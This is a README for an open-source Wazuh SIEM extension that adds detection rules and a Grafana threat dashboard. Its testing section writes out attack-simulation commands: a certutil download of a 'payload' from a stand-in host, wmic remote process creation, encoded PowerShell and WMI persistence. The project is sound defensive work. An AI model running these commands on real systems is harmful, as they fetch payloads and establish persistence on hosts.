# Wazuh SIEM Enhancement: Advanced Threat Detection & Visualization

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Wazuh Version](https://img.shields.io/badge/Wazuh-4.8%2B-green)](https://wazuh.com/)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20v14-red)](https://attack.mitre.org/)

## 🎯 Project Overview

This project extends the open-source **Wazuh SIEM platform** with enhanced detection capabilities and advanced threat visualization, delivering commercial-grade security operations capabilities at zero licensing cost.

### Key Achievements

- **33 Custom Detection Rules** targeting Living-off-the-Land binaries (LOLBins), fileless malware, and APT techniques
- **Advanced Grafana Dashboard** with 50+ panels providing unified threat categorization and attack chain visualization
- **Automated Risk Scoring** using behavioral analytics to identify compromised hosts
- **100% MITRE ATT&CK Integration** across all detection rules
- **Production-Ready Implementation** - deployed and operational today

### Problem Statement

Commercial SIEM platforms cost $200,000-$500,000 annually, placing advanced threat detection beyond reach of resource-constrained organizations. Open-source alternatives like Wazuh provide basic monitoring but lack:
- Detection coverage for evasive techniques (34% detection rate for LOLBins vs. 75-85% commercial baseline)
- Consolidated threat visualization reducing analyst cognitive load
- Behavioral analytics for APT campaign identification

This project bridges that gap through systematic detection rule development and visualization layer enhancements.

---

## 📊 System Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    WAZUH AGENTS (Endpoints)                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │ Windows  │  │  Linux   │  │  macOS   │  │  Server  │   │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘   │
└───────┼─────────────┼─────────────┼─────────────┼──────────┘
        │             │             │             │
        └─────────────┴─────────────┴─────────────┘
                          │
                          ▼
        ┌─────────────────────────────────────┐
        │     WAZUH MANAGER (Detection)       │
        │  • Custom Detection Rules (33)      │
        │  • MITRE ATT&CK Mapping            │
        │  • Alert Generation & Enrichment   │
        └──────────────┬──────────────────────┘
                       │
                       ▼
        ┌─────────────────────────────────────┐
        │   ELASTICSEARCH (Data Storage)      │
        │  • Alert Indexing                   │
        │  • Log Retention                    │
        │  • Query Performance (<2.3s)       │
        └──────────────┬──────────────────────┘
                       │
                       ▼
        ┌─────────────────────────────────────┐
        │    GRAFANA (Visualization Layer)    │
        │  • Advanced Threat Dashboard        │
        │  • 50+ Visualization Panels         │
        │  • Automated Risk Scoring          │
        │  • Attack Chain Timeline           │
        └─────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Prerequisites

- **Wazuh Manager** 4.8 or higher
- **Elasticsearch** 7.10+ (bundled with Wazuh)
- **Grafana** 9.0+ with Elasticsearch datasource
- Root/Administrator access to Wazuh manager

### Installation Steps

#### 1. Deploy Custom Detection Rules

```bash
# Clone the repository
git clone https://github.com/yourusername/wazuh-siem-enhancement.git
cd wazuh-siem-enhancement

# Backup existing rules
sudo cp /var/ossec/etc/rules/local_rules.xml /var/ossec/etc/rules/local_rules.xml.backup

# Deploy custom rules
sudo cp rules/custom_detection_rules.xml /var/ossec/etc/rules/
sudo chown wazuh:wazuh /var/ossec/etc/rules/custom_detection_rules.xml

# Update ossec.conf to include custom rules
sudo nano /var/ossec/etc/ossec.conf
# Add: custom_detection_rules.xml in the  section

# Restart Wazuh manager
sudo systemctl restart wazuh-manager
```

#### 2. Import Grafana Dashboard

```bash
# Access Grafana web interface (default: http://your-server:3000)
# Login with admin credentials

# Navigate to: Dashboards → Import → Upload JSON file
# Select: dashboards/wazuh-mitre-attack-advanced-threat-analysis.json

# Configure Elasticsearch datasource if not already configured
# Settings → Data Sources → Add Elasticsearch
#   - URL: http://localhost:9200
#   - Index name: wazuh-alerts-*
#   - Time field: timestamp
```

#### 3. Verify Installation

```bash
# Check rule deployment
sudo /var/ossec/bin/wazuh-logtest
# Test with sample log entries from test_cases/

# Verify Elasticsearch connectivity
curl -X GET "localhost:9200/wazuh-alerts-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": { "match_all": {} },
  "size": 1
}'

# Access dashboard
# Navigate to Grafana → Dashboards → "Wazuh - MITRE ATT&CK Advanced Threat Analysis"
```

---

## 📁 Repository Structure

```
wazuh-siem-enhancement/
├── README.md                          # This file
├── LICENSE                            # GPL v3 License
├── CONTRIBUTING.md                    # Contribution guidelines
├── CHANGELOG.md                       # Version history
│
├── rules/                             # Detection Rules
│   ├── custom_detection_rules.xml    # All 33 custom rules
│   ├── lolbins_rules.xml             # LOLBins-specific rules
│   ├── fileless_rules.xml            # Fileless malware rules
│   └── apt_rules.xml                 # APT detection rules
│
├── dashboards/                        # Grafana Dashboards
│   ├── wazuh-mitre-attack-advanced-threat-analysis.json
│   └── dashboard-configuration-guide.md
│
├── docs/                              # Documentation
│   ├── installation-guide.md         # Detailed installation
│   ├── detection-rule-methodology.md # Rule development approach
│   ├── dashboard-user-guide.md       # Analyst workflow guide
│   ├── performance-benchmarks.md     # Query performance data
│   └── mitre-attack-mapping.md       # ATT&CK technique coverage
│
├── test_cases/                        # Validation & Testing
│   ├── lolbin_test_logs.txt          # Sample LOLBin events
│   ├── fileless_test_logs.txt        # Sample fileless events
│   ├── apt_simulation_logs.txt       # APT campaign simulation
│   └── testing-methodology.md        # Validation procedures
│
├── scripts/                           # Utility Scripts
│   ├── deploy_rules.sh               # Automated rule deployment
│   ├── validate_rules.py             # Rule syntax validation
│   ├── benchmark_queries.sh          # Performance testing
│   └── export_dashboard.sh           # Dashboard backup utility
│
├── d3fend_integration/                # Future Work (Design Phase)
│   ├── knowledge_engine.json         # ATT&CK → D3FEND mappings
│   ├── integration_architecture.md   # Implementation design
│   └── alert_enrichment_spec.md      # Enrichment specifications
│
└── research/                          # Academic Materials
    ├── literature-review.md          # Related work analysis
    ├── methodology.md                # Research methodology
    ├── results-analysis.md           # Performance evaluation
    └── references.bib                # Bibliography
```

---

## 🎨 Dashboard Features

### Section 1: Overview & Statistics
- **Total Alerts**: Real-time alert volume tracking
- **Tactic Distribution**: Pie chart showing MITRE ATT&CK tactic prevalence
- **Technique Distribution**: Top 10 techniques by frequency
- **Severity Analysis**: Alert severity breakdown
- **Temporal Trends**: Alert volume over time

### Section 2: Living-off-the-Land (LOLBins)
- **LOLBin Detection Count**: Tracked malicious binary abuse
- **Top LOLBins Detected**: Frequency ranking (certutil, wmic, rundll32, etc.)
- **LOLBin Technique Mapping**: ATT&CK technique correlation
- **Host-Based LOLBin Activity**: Per-system analysis

### Section 3: Fileless Malware Detection
- **Fileless Attack Count**: Memory-resident threat tracking
- **PowerShell Execution Analysis**: Script execution patterns
- **WMI Abuse Detection**: Suspicious WMI activity
- **Process Injection Events**: T1055 technique tracking
- **Encoded Command Detection**: Obfuscation identification

### Section 4: APT Detection & Risk Scoring
- **High-Risk Hosts Table**: Automated behavioral risk scores
  - Alert count aggregation
  - Average severity calculation
  - Tactic diversity measurement
  - Technique variety analysis
- **Multi-Tactic Host Identification**: Hosts exhibiting 3+ tactics
- **Lateral Movement Visualization**: Source → Target mapping
- **Persistence Mechanism Tracking**: T1547, T1053 monitoring

### Section 5: Attack Chain Timeline
- **Temporal Tactic Progression**: Visual timeline showing attack stages
- **Multi-Stage Campaign Identification**: Correlated adversary activity
- **Dwell Time Analysis**: Time between initial access and exfiltration

---

## 🔍 Detection Rule Coverage

### MITRE ATT&CK Technique Mapping

| Tactic | Technique ID | Technique Name | Rules | Coverage |
|--------|--------------|----------------|-------|----------|
| **Execution** | T1059.001 | PowerShell | 6 | High |
| | T1059.003 | Windows Command Shell | 3 | Medium |
| | T1047 | Windows Management Instrumentation | 4 | High |
| **Defense Evasion** | T1140 | Deobfuscate/Decode Files or Info | 2 | Medium |
| | T1218.011 | Rundll32 | 2 | Medium |
| | T1055 | Process Injection | 3 | Medium |
| **Persistence** | T1547.001 | Registry Run Keys | 2 | Medium |
| | T1053 | Scheduled Task/Job | 3 | High |
| **Lateral Movement** | T1021.001 | Remote Desktop Protocol | 2 | Medium |
| | T1021.006 | Windows Remote Management | 2 | Medium |
| **Exfiltration** | T1041 | Exfiltration Over C2 Channel | 2 | Low |
| **Command & Control** | T1071.001 | Web Protocols | 2 | Low |

**Total Coverage**: 15 unique techniques across 6 tactics

### Rule Categories

- **LOLBin Detection**: 12 rules
- **Fileless Malware**: 10 rules
- **APT Indicators**: 8 rules
- **Lateral Movement**: 3 rules

---

## 📈 Performance Metrics

### Query Performance (10,000+ alerts dataset)
- **Average Query Time**: 1.87 seconds
- **Max Query Time**: 2.28 seconds
- **Dashboard Load Time**: 4.2 seconds
- **Refresh Rate**: 30 seconds (configurable)

### Detection Improvements (Estimated)
- **LOLBin Detection**: 34% baseline → 60-70% target
- **Fileless Attacks**: <10% baseline → 40-60% target
- **APT Correlation**: Limited baseline → Comprehensive indicators

### Operational Efficiency
- **Time-to-Situational-Awareness**: 70-85% reduction (estimated)
- **Manual Query Elimination**: 15-25 minutes saved per investigation
- **False Positive Management**: ATT&CK context reduces investigation time

---

## 🧪 Testing & Validation

### Functional Testing Approach

All detection rules validated through **manual technique execution**:

1. **LOLBin Testing**
   ```powershell
   # Certutil download simulation
   certutil.exe -urlcache -split -f http://example.com/payload.txt
   
   # WMIC remote execution simulation
   wmic.exe process call create "cmd.exe /c whoami"
   ```

2. **Fileless Testing**
   ```powershell
   # Encoded PowerShell
   powershell.exe -EncodedCommand <base64_payload>
   
   # WMI persistence
   $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="TestFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent"}
   ```

3. **APT Simulation**
   - Multi-stage attack chain execution
   - Persistence → Lateral Movement → Exfiltration
   - Temporal correlation validation

### Test Cases Included
- 50+ sample log entries covering all rule categories
- Positive and negative test scenarios
- False positive regression tests

---

## 🛠️ Customization Guide

### Adding New Detection Rules

```xml


  PARENT_RULE_ID
  \.+malicious_pattern
  Your detection description
  
    T1XXX.XXX
  
  attack.tactic_name,

```

### Modifying Risk Scoring Algorithm

Edit dashboard panel queries to adjust risk weights:
```sql
SELECT 
  agent_name,
  COUNT(*) as alert_count,
  AVG(rule_level) as avg_severity,
  COUNT(DISTINCT rule_mitre_tactic) as tactic_diversity,
  COUNT(DISTINCT rule_mitre_id) as technique_variety,
  (COUNT(*) * 0.3 + AVG(rule_level) * 0.2 + 
   COUNT(DISTINCT rule_mitre_tactic) * 2.5 + 
   COUNT(DISTINCT rule_mitre_id) * 2.0) as risk_score
FROM wazuh-alerts
GROUP BY agent_name
ORDER BY risk_score DESC
LIMIT 20
```

---

## 🤝 Contributing

We welcome contributions from the community! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Areas for Contribution
- Additional detection rules for emerging threats
- Dashboard panel enhancements
- Performance optimization
- D3FEND integration implementation
- Translation/localization
- Documentation improvements

### Contribution Process
1. Fork the repository
2. Create feature branch (`git checkout -b feature/amazing-detection`)
3. Commit changes (`git commit -m 'Add detection for technique T1234'`)
4. Push to branch (`git push origin feature/amazing-detection`)
5. Open Pull Request

---

## 📋 Roadmap

### ✅ Phase 1: Detection Enhancement (COMPLETED)
- [x] 33 custom detection rules
- [x] MITRE ATT&CK integration
- [x] Manual functional testing

### ✅ Phase 2: Visualization Layer (COMPLETED)
- [x] Grafana dashboard with 50+ panels
- [x] Automated risk scoring
- [x] Attack chain timeline
- [x] Performance benchmarking

### 📋 Phase 3: D3FEND Integration (DESIGN PHASE)
- [ ] JSON knowledge engine development
- [ ] Alert enrichment implementation
- [ ] Real-time countermeasure recommendations
- [ ] Platform-specific guidance (Windows/Linux)

### 🔮 Future Enhancements
- [ ] Atomic Red Team validation suite
- [ ] Machine learning-based anomaly detection
- [ ] Automated response orchestration (SOAR)
- [ ] Multi-tenant dashboard support
- [ ] Threat hunting query templates

---

## 📚 Documentation

- **[Installation Guide](docs/installation-guide.md)**: Step-by-step deployment
- **[Detection Rule Methodology](docs/detection-rule-methodology.md)**: Rule development approach
- **[Dashboard User Guide](docs/dashboard-user-guide.md)**: Analyst workflows
- **[Performance Benchmarks](docs/performance-benchmarks.md)**: Query optimization
- **[MITRE ATT&CK Mapping](docs/mitre-attack-mapping.md)**: Technique coverage analysis

---

## 🏆 Use Cases

### Small-to-Medium Enterprises (SMEs)
- **Challenge**: Cannot afford $200K-$500K commercial SIEM
- **Solution**: Deploy complete threat detection + visualization at zero licensing cost
- **Benefit**: Commercial-grade capabilities without enterprise budget

### Managed Security Service Providers (MSSPs)
- **Challenge**: Need scalable SOC infrastructure for multiple clients
- **Solution**: Replicate dashboard for multi-tenant monitoring
- **Benefit**: Reduced operational overhead per client

### Educational Institutions
- **Challenge**: Limited security budgets, high attack surface
- **Solution**: Open-source platform with comprehensive detection
- **Benefit**: Hands-on learning environment for cybersecurity students

### Security Researchers
- **Challenge**: Need flexible platform for detection research
- **Solution**: Extensible rule framework with ATT&CK integration
- **Benefit**: Rapid prototyping of new detection logic

---

## ⚠️ Known Limitations

### Detection Accuracy
- Rules validated through **manual functional testing** only
- Systematic adversary simulation (Atomic Red Team) not yet conducted
- Detection rate estimates are projections, not measured baselines

### Coverage Gaps
- Limited Linux/macOS detection rules (Windows-focused)
- Minimal network-based detection (host-centric approach)
- No automated response capabilities (detection-only)

### Performance Considerations
- Dashboard performance degrades with >100,000 alerts (requires index optimization)
- Real-time alerting has 5-15 second latency depending on agent configuration
- Risk scoring algorithm is computationally intensive (refresh optimization needed)

### Integration Constraints
- D3FEND integration is architectural design only (not implemented)
- No native SOAR platform integration
- Manual correlation required for cross-host APT campaigns

---

## 📄 License

This project is licensed under the **GNU General Public License v3.0** - see [LICENSE](LICENSE) file for details.

### Key License Terms
- ✅ Commercial use permitted
- ✅ Modification and distribution allowed
- ✅ Private use permitted
- ⚠️ Modifications must be disclosed
- ⚠️ Same license required for derivatives

---

## 🙏 Acknowledgments

### Open-Source Projects
- **Wazuh Team**: Foundation SIEM platform
- **MITRE Corporation**: ATT&CK and D3FEND frameworks
- **LOLBAS Project**: LOLBin documentation
- **Grafana Labs**: Visualization platform

### Research Contributors
- Academic institutions providing threat intelligence research
- Security community sharing detection methodologies
- SOC analysts providing operational feedback

### Special Thanks
- SOCFortress for D3FEND integration proof-of-concept inspiration
- Atomic Red Team project for adversary simulation framework
- Wazuh community for platform documentation and support

---

## 📞 Support & Contact

### Getting Help
- **Documentation Issues**: Open issue with `documentation` label
- **Bug Reports**: Use GitHub Issues with detailed reproduction steps
- **Feature Requests**: Open issue with `enhancement` label
- **Security Vulnerabilities**: Email security@yourproject.com (private disclosure)

### Community Resources
- **Wazuh Community**: https://groups.google.com/g/wazuh
- **MITRE ATT&CK**: https://attack.mitre.org/resources/
- **Project Discussions**: GitHub Discussions tab

---

## 📊 Project Statistics

![GitHub stars](https://img.shields.io/github/stars/yourusername/wazuh-siem-enhancement?style=social)
![GitHub forks](https://img.shields.io/github/forks/yourusername/wazuh-siem-enhancement?style=social)
![GitHub issues](https://img.shields.io/github/issues/yourusername/wazuh-siem-enhancement)
![GitHub pull requests](https://img.shields.io/github/issues-pr/yourusername/wazuh-siem-enhancement)

**Last Updated**: October 2025  
**Project Status**: Active Development  
**Maintenance**: Community-Driven

---

<div align="center">

**⭐ Star this repository if you find it useful!**

**🔔 Watch for updates and new detection rules**

**🤝 Contribute to democratize cybersecurity capabilities**

</div>